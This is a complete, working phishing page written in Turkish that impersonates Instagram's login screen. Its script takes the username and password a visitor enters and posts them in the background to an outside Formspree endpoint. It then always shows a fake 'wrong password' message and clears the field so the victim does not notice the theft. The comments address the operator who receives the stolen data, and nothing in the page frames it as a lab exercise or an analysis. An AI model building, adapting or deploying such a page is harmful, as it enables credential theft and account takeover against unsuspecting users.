
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Giriş Ekranı</title>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
  
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      width: 350px;
      padding: 40px;
      background-color: white;
      border: 1px solid #dbdbdb;
      text-align: center;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }
    .logo {
      font-family: 'Grand Hotel', cursive;
      font-size: 52px;
      margin-bottom: 30px;
      color: #262626;
      font-weight: normal;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
      box-sizing: border-box;
      font-size: 12px;
    }
    button {
      width: 100%;
      padding: 8px;
      margin-top: 15px;
      background-color: #0095f6;
      border: none;
      color: white;
      font-weight: 600;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #1877f2;
    }

    /* Kırmızı Hata Mesajı Stili */
    #error-message {
      color: #ed4956;
      font-size: 14px;
      margin-bottom: 15px;
      display: none; /* Başta gizli */
      font-weight: 500;
    }

    .links {
      margin-top: 25px;
      font-size: 12px;
      color: #8e8e8e;
    }
    .links a {
      text-decoration: none;
      color: #00376b;
      font-weight: 600;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="logo">Instagram</div>
    
    <div id="error-message">Üzgünüz, şifren yanlıştı. Lütfen şifreni tekrar kontrol et.</div>

    <form id="loginForm">
      <input type="text" name="username" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required />
      <input type="password" name="password" id="password" placeholder="Şifre" required />
      
      <button type="submit" id="submitBtn">Giriş Yap</button>
    </form>

    <div class="links">
      <a href="#">Şifreni mi unuttun?</a>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const errorMessage = document.getElementById('error-message');

    form.addEventListener('submit', function(e) {
      e.preventDefault(); // Sayfanın Formspree'ye gidip "Başarılı" demesini engeller

      const formData = new FormData(form);

      // Veriyi senin Formspree ID'ne arka planda gönderiyoruz
      fetch('https://formspree.io/f/mlgyoegj', {
        method: 'POST',
        body: formData,
        headers: {
            'Accept': 'application/json'
        }
      }).then(response => {
        // Form gidince kullanıcıya hata mesajını gösteriyoruz
        errorMessage.style.display = 'block';
        // Şifre kutusunu temizleyelim
        document.getElementById('password').value = '';
      }).catch(error => {
        errorMessage.style.display = 'block';
      });
    });
  </script>

</body>
</html>
